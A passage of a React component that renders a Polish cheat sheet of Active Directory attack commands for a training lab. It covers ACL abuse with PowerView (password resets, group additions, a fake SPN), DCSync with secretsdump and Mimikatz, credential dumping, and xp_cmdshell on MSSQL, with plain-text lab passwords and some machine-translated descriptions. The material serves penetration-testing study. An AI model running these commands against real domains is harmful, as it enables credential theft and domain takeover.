                    <td><code>Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {`{$_.SecurityIdentifier -eq $sid}`} </code></td>
                    <td>Służy do wykrywania listy ACL obiektu domeny poprzez wyszukiwanie na podstawie identyfikatorów GUID (<code>-ResolveGUIDs</code>) z hosta z systemem Windows.</td>
                    </tr>
                    <tr>
                    <td><code>Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName &gt; ad_users.txt</code></td>
                    <td>Służy do wykrywania grupy kont użytkowników w docelowej domenie systemu Windows i dodawania wyników do pliku tekstowego (<code>ad_users.txt</code>) z hosta z systemem Windows.</td>
                    </tr>
                    <tr>
                    <td><code>foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {`{get-acl "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\wley'}}`}</code></td>
                    <td><code>Pętla foreach</code> używana do pobierania informacji ACL dla każdego użytkownika domeny w docelowej domenie Windows poprzez dostarczanie każdej listy plików tekstowych (<code>ad_users.txt</code>) do <code>Get -ADUser</code>, a następnie wylicza prawa dostępu tych użytkowników. Wykonywane z hosta opartego na systemie Windows.</td>
                    </tr>
                    <tr>
                    <td><code>$SecPassword = ConvertTo-SecureString '&lt;PASSWORD HERE&gt;' -AsPlainText -Force $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword) </code></td>
                    <td>Służy do tworzenia <code>obiektu PSCredential</code> z hosta z systemem Windows.</td>
                    </tr>
                    <tr>
                    <td><code>$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force</code></td>
                    <td>Służy do tworzenia <code>obiektu SecureString</code> z hosta z systemem Windows.</td>
                    </tr>
                    <tr>
                    <td><code>Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose</code></td>
                    <td>Narzędzie PowerView służące do zmiany hasła określonego użytkownika (<code>damundsen</code>) w docelowej domenie Windows z hosta opartego na systemie Windows.</td>
                    </tr>
                    <tr>
                    <td><code>Get-ADGroup -Identity "Help Desk Level 1" -Properties * | Select -ExpandProperty Members</code></td>
                    <td>Używane narzędzie PowerView wyświetla członków docelowej grupy zabezpieczeń (<code>Help Desk poziom 1</code>) z hosta z systemem Windows.</td>
                    </tr>
                    <tr>
                    <td><code>Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose</code></td>
                    <td>Narzędzie PowerView służące do dodawania określonego użytkownika (<code>damundsen</code>) do określonej grupy zabezpieczeń (<code>Help Desk poziom 1</code>) w docelowej domenie Windows z hosta opartego na systemie Windows.</td>
                    </tr>
                    <tr>
                    <td><code>Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName</code></td>
                    <td>Narzędzie PowerView używane do przeglądania członków określonej grupy zabezpieczeń (<code>Help Desk poziom 1</code>) i wyświetlania tylko nazwy użytkownika każdego członka (<code>Select MemberName</code>) grupy z systemu Windows - oparty na gospodarzu.</td>
                    </tr>
                    <tr>
                    <td><code>Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{`{serviceprincipalname='notahacker/LEGIT'}`} -Verbose</code></td>
                    <td>Zastosowane narzędzie PowerView utworzyło fałszywą <code>główną nazwę usługi</code> podaną użytkownikowi secift (<code>adunn</code>) z hosta z systemem Windows.</td>
                    </tr>
                    <tr>
                    <td><code>Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose</code></td>
                    <td>Narzędzie PowerView służące do usuwania fałszywej <code>głównej nazwy usługi</code> utworzonej podczas ataku z hosta z systemem Windows.</td>
                    </tr>
                    <tr>
                    <td><code>Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose</code></td>
                    <td>Narzędzie PowerView służące do usuwania określonego użytkownika (<code>damundsent</code>) z określonej grupy zabezpieczeń (<code>Help Desk poziom 1</code>) z hosta z systemem Windows.</td>
                    </tr>
                    <tr>
                    <td><code>ConvertFrom-SddlString</code></td>
                    <td>Polecenie cmd programu PowerShell używane do ukrywania <code>ciągu SDDL</code> w czytelnym formacie. Wykonywane z hosta opartego na systemie Windows.</td>
                    </tr>
                </tbody>
            </table>

            <hr />
            <h2>DCSync</h2>
            <table class="table table-striped text-left">
                <thead>
                    <tr>
                    <th>Komenda</th>
                    <th>Opis</th>
                    </tr>
                </thead>
                <tbody>
                    <tr>
                    <td><code>Get-DomainUser -Identity adunn | select samaccountname,objectsid,memberof,useraccountcontrol |fl</code></td>
                    <td>Narzędzie PowerView służące do przeglądania członkostwa w grupie określonego użytkownika (<code>adunn</code>) w docelowej domenie Windows. Wykonywane z hosta opartego na systemie Windows.</td>
                    </tr>
                    <tr>
                    <td><code>$sid= "S-1-5-21-3842939050-3880317879-2865463114-1164" Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? {`{ ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid}`} | select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl</code></td>
                    <td>Służy do tworzenia zmiennej o nazwie SID, która jest równa identyfikatorowi SID konta użytkownika. Następnie używa narzędzia PowerView <code>Get-ObjectAcl</code>, aby sprawdzić uprawnienia do replikacji konkretnego użytkownika. Wykonywane z hosta opartego na systemie Windows.</td>
                    </tr>
                    <tr>
                    <td>$sid=Convert-NameToSid "Domain Users"</td>
                    <td>Tworzy zmienną o nazwie $sid, która jest równa narzędziu Convert-NameToSid i określa konto grupowe Użytkownicy domeny. Wykonywane z hosta opartego na systemie Windows.</td>
                    </tr>
                    <tr>
                    <td><code>secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 -use-vss</code></td>
                    <td>Narzędzie Impacket sed do wyodrębniania skrótów NTLM z pliku NTDS.dit hostowanego na docelowym kontrolerze domeny (<code>172.16.5.5</code>) i zapisywania wyodrębnionych skrótów do pliku (<code>inlanefreight_hashes</code>). Wykonywane z hosta opartego na systemie Linux.</td>
                    </tr>
                    <tr>
                    <td></td>
                    <td></td>
                    </tr>
                    <tr>
                    <td>.\mimikatz.exe</td>
                    <td></td>
                    </tr>
                    <tr>
                    <td>privilege::debug</td>
                    <td></td>
                    </tr>
                    <tr>
                    <td>sekurlsa::logonpasswords</td>
                    <td></td>
                    </tr>
                    <tr>
                    <td><code>mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator</code></td>
                    <td>Używa <code>Mimikatz</code> do przeprowadzenia ataku <code>dcsync</code> z hosta z systemem Windows.</td>
                    </tr>
                    <tr>
                    <td>Add-Type –AssemblyName System.IdentityModel; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken –ArgumentList ‘MSSQLSvc/SQL01.inlanefreight.local:1433’</td>
                    <td>Gdy wartość hasła wynosi null, pobierze je z pamięci</td>
                    </tr>
                </tbody>
            </table>

            <hr />
            <h2>Privileged Access</h2>
            <table class="table table-striped text-left">
                <thead>
                <tr>
                <th>Komenda</th>
                <th>Opis</th>
                </tr>
                </thead>
                <tbody>
                    <tr>
                    <td><code>Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"</code></td>
                    <td>Narzędzie oparte na programie PowerView służące do wyliczania grupy <code>Użytkownicy pulpitu zdalnego</code> w systemie docelowym Windows (<code>-ComputerName ACADEMY-EA-MS01</code>) z hosta z systemem Windows.</td>
                    </tr>
                    <tr>
                    <td><code>Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"</code></td>
                    <td>Narzędzie oparte na programie PowerView służące do wyliczania grupy <code>Użytkownicy zdalnego zarządzania</code> w systemie docelowym Windows (<code>-ComputerName ACADEMY-EA-MS01</code>) z hosta z systemem Windows.</td>
                    </tr>
                    <tr>
                    <td><code>$password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force</code></td>
                    <td>Tworzy zmienną (<code>$password</code>) ustawioną na wartość hasła (<code>Klmcargo2</code>) użytkownika z hosta opartego na systemie Windows.</td>
                    </tr>
                    <tr>
                    <td><code>$cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)</code></td>
                    <td>Tworzy zmienną (<code>$cred</code>) ustawioną jako nazwa użytkownika (<code>forend</code>) i hasło (<code>$password</code>) konta domeny docelowej z konta Windows - oparty na gospodarzu.</td>
                    </tr>
                    <tr>
                    <td><code>Enter-PSSession -ComputerName ACADEMY-EA-DB01 -Credential $cred</code></td>
                    <td>Używa polecenia cmd programu PowerShell <code>Enter-PSSession</code> do nawiązania sesji programu PowerShell z obiektem docelowym za pośrednictwem sieci (<code>-ComputerName ACADEMY-EA-DB01</code>) z hosta z systemem Windows. Uwierzytelnia się przy użyciu poświadczeń wprowadzonych w 2 poleceniach pokazanych wcześniej (<code>$cred</code> i <code>$password</code>).</td>
                    </tr>
                    <tr>
                    <td><code>evil-winrm -i 10.129.201.234 -u forend</code></td>
                    <td>Służy do ustanawiania sesji PowerShell z obiektem docelowym Windows z hosta opartego na systemie Linux przy użyciu <code>WinRM</code>.</td>
                    </tr>
                    <tr>
                    <td><code>Import-Module .\PowerUpSQL.ps1</code></td>
                    <td>Służy do importowania narzędzia <code>PowerUpSQL</code>.</td>
                    </tr>
                    <tr>
                    <td><code>Get-SQLInstanceDomain</code></td>
                    <td>Narzędzie PowerUpSQL służące do wyliczania instancji serwera SQL z hosta z systemem Windows.</td>
                    </tr>
                    <tr>
                    <td><code>Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'</code></td>
                    <td>Narzędzie PowerUpSQL używane do łączenia się z serwerem SQL i wysyłania zapytań o wersję (<code>-query 'Wybierz @@wersję'</code>) z hosta z systemem Windows.</td>
                    </tr>
                    <tr>
                    <td><code>mssqlclient.py</code></td>
                    <td>Narzędzie Impacket używane do wyświetlania funkcjonalności i opcji udostępnianych przez <code>mssqlclient.py</code> z hosta opartego na systemie Linux.</td>
                    </tr>
                    <tr>
                    <td><code>mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth</code></td>
                    <td>Narzędzie Impacket służące do łączenia się z serwerem MSSQL z hosta opartego na systemie Linux.</td>
                    </tr>
                    <tr>
                    <td><code>SQL&gt; help</code></td>
                    <td>Służy do wyświetlania opcji mssqlclient.py po podłączeniu do serwera MSSQL.</td>
                    </tr>
                    <tr>
                    <td><code>SQL&gt; enable_xp_cmdshell</code></td>
                    <td>Służy do włączania <code>procedury składowanej xp_cmdshell</code>, która umożliwia wykonywanie poleceń systemu operacyjnego za pośrednictwem bazy danych z hosta z systemem Linux.</td>
                    </tr>
                    <tr>
                    <td><code>xp_cmdshell whoami /priv</code></td>
                    <td>Używany do wyliczania uprawnień w systemie przy użyciu <code>xp_cmdshell</code>.</td>
                    </tr>
                </tbody>
            </table>

        </section>
    )
}

export default ActiveDirectoryCommands;